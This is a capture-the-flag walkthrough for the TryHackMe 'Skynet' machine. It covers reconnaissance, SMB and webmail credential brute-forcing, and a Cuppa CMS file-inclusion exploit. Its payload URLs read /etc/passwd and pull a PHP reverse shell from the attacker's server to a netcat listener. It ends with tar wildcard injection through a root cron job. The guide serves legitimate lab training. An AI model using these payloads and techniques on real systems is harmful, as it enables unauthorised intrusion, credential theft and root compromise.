
![intro](https://github.com/user-attachments/assets/f9d84f33-79f8-494d-993e-1398ae195ed4)

# tryhackme-Skynet-writeup
This is a walkthrough for the tryhackme CTF Skynet. I will not provide any flags or passwords as this is intended to be used as a guide.

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -D RND:10 -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-D RND:10 Nmap can send additional packets to confuse network intrusion detection systems (IDS) or hide the true source of the scan by randomly selecting up to 10 decoy IP addresses.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals a few open ports that will prove very useful:

![nmap1](https://github.com/user-attachments/assets/b1fe2435-176d-40e8-94e4-4638fa50b40e)

First, let check out the webserver on port 80. It takes use to a skynet search engine, that doesn't seem to have much of any functionality.

![skynet search](https://github.com/user-attachments/assets/f03da96c-57b1-45b4-9faa-e5f1ff157a88)

Ok, let's try a gobuster scan on the target.
```bash
gobuster dir -u $ip -w=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -o bust.txt
```
The scan reveals a few interesting directories:

![buster](https://github.com/user-attachments/assets/fc0b7eba-d432-4df7-adc7-059c36c20d41)

![nikto](https://github.com/user-attachments/assets/3fd6b280-f9c4-4f27-84bb-446aaf06644e)


Most of them are forbidden, but squirrelmail takes us to a webmail login. This must be the 110/tcp pop3 port that was revealed in the nmap scan. I tried to log in with some default credentials but no luck. Let's take note of the error message "Unknown user or password incorrect."

# SMB Enumeration
Our nmap scan revealed 445/tcp for smbd Samba. 

![nmap smb](https://github.com/user-attachments/assets/0b5faf0f-148e-4228-88a6-695927533129)

A good tool for digger deeper on this is enum4linux. 
```bash
enum4linux $ip | tee enum.txt
```
The scan revealed a list of shares, including anonymous where the mapping wasn't denied, and /milesdyson share. 
Let's try to log onto the anonymous share using smbclient and no password: 

![smbclient anon](https://github.com/user-attachments/assets/72391461-7bd5-4038-9e34-0b40e78c2057)

And we're in! Use get attention.txt and log1.txt as we can see that log1 is only file containing info. Let's make a smb dir and move the files into it:
```bash
mkdir smb | mv attention.txt log1.txt smb
```

![smb files](https://github.com/user-attachments/assets/e1d6ab6d-5abb-4f16-b45e-c923b5873b18)

So we have a message from Miles Dyson about changing passwords and a wordlist, which likely contains a valid password. Let's try to attack Mile's password to squirrelmail.
Since we're dealing with a pretty small number of possible passwords, I'll just use burp suite to attack the login. Turn on burp proxy to capture the post login request, right click the request and sent to intruder. Leave sniper attack selected and position the payload markers on the password, (in my case I just used admin) as shown in the screen shot. Next, move to the payloads tab, and load the smb wordlist log1.txt and click attack. Before long the password will be revealed as it results in a different status and length:

![sniper results](https://github.com/user-attachments/assets/89891a06-33d4-4b14-994a-be277c94fdfc)

We can now log into Miles mail with milesdyson and the password.

There are a couple messages from serenakogan@skynet that appear to contain an encoded binary message. Let's head to CyberChef and decode from binary. We get the message "balls have zero to me to me to me to me to me to me to me to me to". The other message from her is not encrypted and apears to have more song lyrics "i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me t".
I did a little research on what this is, and it was reported on a Facebook AI experiment, where bots who were programmed to engage in negotiations began to develop their own language and this was from bot negotiations. Interesting, but unrelated to this CTF's progress. Here's a link to an article if you interested: https://www.poetryfoundation.org/harriet-books/2017/06/balls-have-zero-to-me-to-me-ais-non-human-language

Let's check out the email samba password reset. It sure enough it has Mile's password for smb login.
Now let's use smbclient again to log onto the smb share:
```bash
smbclient -U milesdyson //$ip/milesdyson
```
And we're in! There's a lot of irrelivent files here, so let's just cd into notes. There's a file called important.txt and I bet it is important. Let's get it.

![important](https://github.com/user-attachments/assets/8fd28c32-991c-4256-a266-fce4f6941628)

This is the T 800 by the way:

![T 800](https://github.com/user-attachments/assets/443575a4-e053-40a5-9523-a7bfa7124a05)

CMS /45kra24zxs28v3yd is a hidden directory:

![hidden dir](https://github.com/user-attachments/assets/06e7034e-fc47-4ee6-b63e-a50fbcad115f)

It's a bio page for Dr. Miles Dyson, but it doesn't seem to have anything else of interest. Let's do a gobuster scan to see if it leads to other hidden directories:
```bash
gobuster dir -u $ip/45kra24zxs28v3yd -w=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -o bust.txt
```
And this reveals an administrator directory:


![cuppa cms](https://github.com/user-attachments/assets/8a36934b-9b82-4bb1-835d-8a265ca543d4)

I tried logging in with the credentials we found earlier but no luck. Let's try searching for vulnerabilities in this "cuppa cms" with searchsploit.

![searchsploit](https://github.com/user-attachments/assets/24dcf396-5117-43f4-972f-947882757361)

Here's a run down of the exploit: 
#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

So, let's try to get the /etc/passwd file first. Our crafted payload should look like this but with whatever your target IP is:
```bash
http://10.10.19.189/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
And we have the /etc/passwd file, which we will save.
Now, let's craft a payload based off the the first example to get a reverse shell. We'll head to revshells.com, input your IP and port(I'm using the default 9001. Now scroll down on the left and I'm going to use the PHP Pentest Monkey shell. Save it as a file on your machine. Set up a netcat listener on the listening port in our shell.
```bash
nc -lvnp 9001
```
And set up a python server:
```bash
python3 -m http.server
```
Our crafted payload should look like this, except the target IP and whatever your named your shell file:
```bash
http://10.10.33.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.184.75:8000/monkey.php
```
And we down have a reverse shell as www-data! Upgrade your shell as shown in the screen shot:

![shell](https://github.com/user-attachments/assets/c75151c8-6f82-47a1-bf9b-9635d0615000)

Just to avoid confusion, after setting the xterm, and suspending your shell. The two are stty commands are to copy your ability to use tab completion and are entered form your machine:
```bash
stty raw -echo; fg
```
```bash
stty rows 16 columns 138
```
# Privilege Escalation
Now, let's find a way to escalate privilages.
In mile's home directory we can cat user.txt.
I also found an interesting file backups/backup.sh. Root can execute this file but we can read it. 

![image](https://github.com/user-attachments/assets/71faab58-630e-42a4-b1bd-61611c13d212)

This file is a bash script, that cds to /var/ww/html, and creates a tar archieve to backup.tgz. The * in this case is a wildcard function that can be abused. What we can do because of that * wildcard is inject into for our own purposes. Here is a link to an article about wildcard injection: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/  

Let's use linpeas.sh to get a broad over view of vulnerabilities on the target. If you don't already have it on your machine you can use this command to download it:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
Now, python server from your machine:
```bash
python3 -m http.server
```
Then run the following commands shown in the screen shot from the target machine using your attacker IP:

![linpeas sh](https://github.com/user-attachments/assets/a83820c6-c8da-4987-bbf7-6e40107d26e2)


# Exploitation
Now, let's cat output and see what we can find. When we get to the cron jobs there is a very important one that we can use:

![cron job](https://github.com/user-attachments/assets/a01be8d8-cfc3-4082-a637-a21b3f7a9c26)

This showing that every minute, root is excuting the backups/backup.sh file That has the potential for a wild card injection. 
So, what will will do is write our own script called shell.sh. Then injection the shell.sh into the checkpoint so it we be excuted by root, every minute as we saw in he cron job. Because these files are in the html directory the wild card tar function will expand them, and they will be executed to give us root.
Let's go about this by checking out /bin/bash:

We will write a script to have root, make /bin/bash a set uid binary, so that we can invoke it with the command /bin/bash -p to become root.
This process is demonstarted in the screen shot below:


![exploit](https://github.com/user-attachments/assets/83ea6cd9-1d10-4b21-836d-ca3fc2aab4a4)

I hope you enjoyed this CTF, hasta la vista baby!

